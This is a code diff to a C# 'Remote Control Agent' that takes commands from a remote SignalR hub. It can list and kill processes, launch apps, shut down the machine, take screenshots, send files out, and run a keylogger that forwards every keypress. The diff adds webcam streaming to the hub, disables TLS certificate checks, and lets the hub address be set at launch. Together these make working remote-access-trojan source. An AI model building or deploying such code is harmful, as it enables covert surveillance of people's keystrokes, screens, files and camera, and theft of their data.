@@ -1,3 +1,5 @@
+using AForge.Video;
+using AForge.Video.DirectShow;
 using Microsoft.AspNetCore.SignalR.Client;
 using System;
 using System.Diagnostics;
@@ -18,29 +20,43 @@ namespace AgentApp
         private static extern short GetAsyncKeyState(int vKey);
 
         private static bool _isKeylogging = false;
+        
+        // For Webcam Streaming
+        private static VideoCaptureDevice _videoSource;
+        private static HubConnection _connection;
+        private static bool _firstFrameSent = false;
 
         static async Task Main(string[] args)
         {
             Console.WriteLine("Starting Remote Control Agent...");
-            // Use http vs https based on dev server setup. Default is 5122 or 5001 usually.
-            // When user runs it, they might need to config port. 
-            var hubUrl = "http://localhost:5000/remoteHub"; 
+            // Allow passing Hub IP/URL via command line arguments
+            var hubUrl = args.Length > 0 ? args[0] : "http://localhost:5000/remoteHub"; 
             Console.WriteLine($"Connecting to {hubUrl}...");
 
-            var connection = new HubConnectionBuilder()
-                .WithUrl(hubUrl)
+            _connection = new HubConnectionBuilder()
+                .WithUrl(hubUrl, options => 
+                {
+                    options.HttpMessageHandlerFactory = handler =>
+                    {
+                        if (handler is System.Net.Http.HttpClientHandler clientHandler)
+                        {
+                            clientHandler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
+                        }
+                        return handler;
+                    };
+                })
                 .WithAutomaticReconnect()
                 .Build();
 
-            connection.Closed += async (error) =>
+            _connection.Closed += async (error) =>
             {
                 Console.WriteLine("Connection lost. Reconnecting...");
                 await Task.Delay(new Random().Next(0, 5) * 1000);
-                await connection.StartAsync();
+                await _connection.StartAsync();
             };
 
             // Register handlers for Hub commands
-            connection.On("GetProcessesCommand", async () => 
+            _connection.On("GetProcessesCommand", async () => 
             {
                 Console.WriteLine("Command Received: GetProcessesCommand");
                 try
@@ -54,7 +70,7 @@ namespace AgentApp
                         }).ToList();
 
                     var json = JsonSerializer.Serialize(processes);
-                    await connection.InvokeAsync("SendProcessesResult", "", json);
+                    await _connection.InvokeAsync("SendProcessesResult", "", json);
                 }
                 catch (Exception ex)
                 {
@@ -62,7 +78,7 @@ namespace AgentApp
                 }
             });
 
-            connection.On<int>("KillProcessCommand", (processId) => 
+            _connection.On<int>("KillProcessCommand", (processId) => 
             {
                 Console.WriteLine($"Command Received: KillProcessCommand for PID {processId}");
                 try
@@ -78,7 +94,7 @@ namespace AgentApp
             });
 
             // --- NEW: Applications Management ---
-            connection.On("GetApplicationsCommand", async () => 
+            _connection.On("GetApplicationsCommand", async () => 
             {
                 Console.WriteLine("Command Received: GetApplicationsCommand");
                 try
@@ -93,7 +109,7 @@ namespace AgentApp
                         }).ToList();
 
                     var json = JsonSerializer.Serialize(apps);
-                    await connection.InvokeAsync("SendApplicationsResult", "", json);
+                    await _connection.InvokeAsync("SendApplicationsResult", "", json);
                 }
                 catch (Exception ex)
                 {
@@ -101,7 +117,7 @@ namespace AgentApp
                 }
             });
 
-            connection.On<string>("StartAppCommand", (appPath) => 
+            _connection.On<string>("StartAppCommand", (appPath) => 
             {
                 Console.WriteLine($"Command Received: StartAppCommand for {appPath}");
                 try
@@ -116,20 +132,20 @@ namespace AgentApp
             });
 
             // --- NEW: Power Management ---
-            connection.On("ShutdownCommand", () => 
+            _connection.On("ShutdownCommand", () => 
             {
                 Console.WriteLine("Command Received: ShutdownCommand");
                 try { Process.Start("shutdown.exe", "/s /t 0"); } catch { }
             });
 
-            connection.On("RestartCommand", () => 
+            _connection.On("RestartCommand", () => 
             {
                 Console.WriteLine("Command Received: RestartCommand");
                 try { Process.Start("shutdown.exe", "/r /t 0"); } catch { }
             });
 
             // --- NEW: Screen Capture ---
-            connection.On("TakeScreenshotCommand", async () => 
+            _connection.On("TakeScreenshotCommand", async () => 
             {
                 Console.WriteLine("Command Received: TakeScreenshotCommand");
                 try
@@ -155,7 +171,7 @@ namespace AgentApp
                             byte[] imageBytes = ms.ToArray();
                             string base64String = Convert.ToBase64String(imageBytes);
                             
-                            await connection.InvokeAsync("SendScreenshotResult", "", base64String);
+                            await _connection.InvokeAsync("SendScreenshotResult", "", base64String);
                         }
                     }
                 }
@@ -166,7 +182,7 @@ namespace AgentApp
             });
 
             // --- NEW: File Download ---
-            connection.On<string>("DownloadFileCommand", async (filePath) => 
+            _connection.On<string>("DownloadFileCommand", async (filePath) => 
             {
                 Console.WriteLine($"Command Received: DownloadFileCommand for {filePath}");
                 try
@@ -176,7 +192,7 @@ namespace AgentApp
                         byte[] fileBytes = await File.ReadAllBytesAsync(filePath);
                         string base64Data = Convert.ToBase64String(fileBytes);
                         string fileName = Path.GetFileName(filePath);
-                        await connection.InvokeAsync("SendFileResult", "", fileName, base64Data);
+                        await _connection.InvokeAsync("SendFileResult", "", fileName, base64Data);
                         Console.WriteLine("File sent successfully.");
                     }
                     else
@@ -191,7 +207,7 @@ namespace AgentApp
             });
 
             // --- NEW: Keylogger ---
-            connection.On("StartKeyloggerCommand", () => 
+            _connection.On("StartKeyloggerCommand", () => 
             {
                 Console.WriteLine("Command Received: StartKeyloggerCommand");
                 if(!_isKeylogging)
@@ -209,7 +225,7 @@ namespace AgentApp
                                 {
                                     string keyName = ((ConsoleKey)i).ToString();
                                     // Send key immediately 
-                                    await connection.InvokeAsync("SendKeylogData", "", $"[{keyName}]");
+                                    await _connection.InvokeAsync("SendKeylogData", "", $"[{keyName}]");
                                 }
                             }
                             await Task.Delay(10); // Polling interval
@@ -218,26 +234,134 @@ namespace AgentApp
                 }
             });
 
-            connection.On("StopKeyloggerCommand", () => 
+            _connection.On("StopKeyloggerCommand", () => 
             {
                 Console.WriteLine("Command Received: StopKeyloggerCommand");
                 _isKeylogging = false;
             });
 
+            // --- NEW: Webcam Stream ---
+            _connection.On("StartWebcamCommand", () => 
+            {
+                Console.WriteLine("Command Received: StartWebcamCommand");
+                
+                try 
+                {
+                    FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                    if (videoDevices.Count > 0)
+                    {
+                        if (_videoSource == null)
+                        {
+                            var device = videoDevices[0];
+                            Console.WriteLine($"Found camera: {device.Name}");
+                            _videoSource = new VideoCaptureDevice(device.MonikerString);
+                            
+                            // Optional: Lower resolution to save bandwidth
+                            if (_videoSource.VideoCapabilities.Length > 0)
+                            {
+                                _videoSource.VideoResolution = _videoSource.VideoCapabilities.OrderBy(v => v.FrameSize.Width).First();
+                                Console.WriteLine($"Camera resolution set to: {_videoSource.VideoResolution.FrameSize.Width}x{_videoSource.VideoResolution.FrameSize.Height}");
+                            }
+                            
+                            _videoSource.NewFrame += new NewFrameEventHandler(video_NewFrame);
+                            _videoSource.VideoSourceError += new VideoSourceErrorEventHandler(video_VideoSourceError);
+                        }
+
+                        if (!_videoSource.IsRunning)
+                        {
+                            Console.WriteLine("Starting camera...");
+                            _firstFrameSent = false;
+                            _videoSource.Start();
+                            Console.WriteLine("Camera start signal sent. Waiting for frames...");
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("No webcam devices found on this PC.");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Exception when starting camera: {ex.Message}");
+                }
+            });
+
+            _connection.On("StopWebcamCommand", () => 
+            {
+                Console.WriteLine("Command Received: StopWebcamCommand");
+                try 
+                {
+                    if (_videoSource != null && _videoSource.IsRunning)
+                    {
+                        Console.WriteLine("Stopping camera...");
+                        _videoSource.SignalToStop();
+                        // Wait for it to stop
+                        _videoSource.WaitForStop();
+                        Console.WriteLine("Camera stopped.");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"Exception when stopping camera: {ex.Message}");
+                }
+            });
+
             try
             {
-                await connection.StartAsync();
+                await _connection.StartAsync();
                 Console.WriteLine("Connected to Hub successfully!");
-                await connection.InvokeAsync("RegisterAgent", Environment.MachineName);
+                await _connection.InvokeAsync("RegisterAgent", Environment.MachineName);
             }
             catch (Exception ex)
             {
                 Console.WriteLine($"Error starting connection. Is WebApp running? {ex.Message}");
             }
 
-            Console.WriteLine("Agent is running... Press any key to exit.");
-            Console.ReadKey();
-            await connection.StopAsync();
+            Console.WriteLine("Agent is running... Press Ctrl+C to exit.");
+            await Task.Delay(-1);
+            await _connection.StopAsync();
+        }
+
+        // Handle frames from webcam and stream over SignalR
+        private static void video_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            try
+            {
+                // Clone the bitmap since eventArgs.Frame goes out of scope and is disposed
+                using (Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone())
+                {
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        // Save as JPEG to keep memory small over signalr
+                        // Note: Using a low quality parameter requires an EncoderParameter, default Save is fine for now
+                        bitmap.Save(ms, ImageFormat.Jpeg);
+                        byte[] imageBytes = ms.ToArray();
+                        string base64String = Convert.ToBase64String(imageBytes);
+
+                        if (_connection != null && _connection.State == HubConnectionState.Connected)
+                        {
+                            // Fire and forget so we don't hold up the camera thread
+                            _ = _connection.InvokeAsync("SendWebcamFrame", "", base64String);
+                            
+                            if (!_firstFrameSent)
+                            {
+                                Console.WriteLine("Thành công! Frame hình ảnh đầu tiên đã được gửi đi. Camera đang stream.");
+                                _firstFrameSent = true;
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error sending video frame: " + ex.Message);
+            }
+        }
+
+        private static void video_VideoSourceError(object sender, VideoSourceErrorEventArgs eventArgs)
+        {
+            Console.WriteLine($"[CAMERA LỖI] {eventArgs.Description}");
+            Console.WriteLine("-> NGUYÊN NHÂN THƯỜNG GẶP: Camera đang bị một phần mềm khác sử dụng (VD: Bạn đang mở sẵn app Camera của Windows, OBS, hoặc Zalo/Zoom). Hãy đóng app đó lại!!");
         }
     }
 }
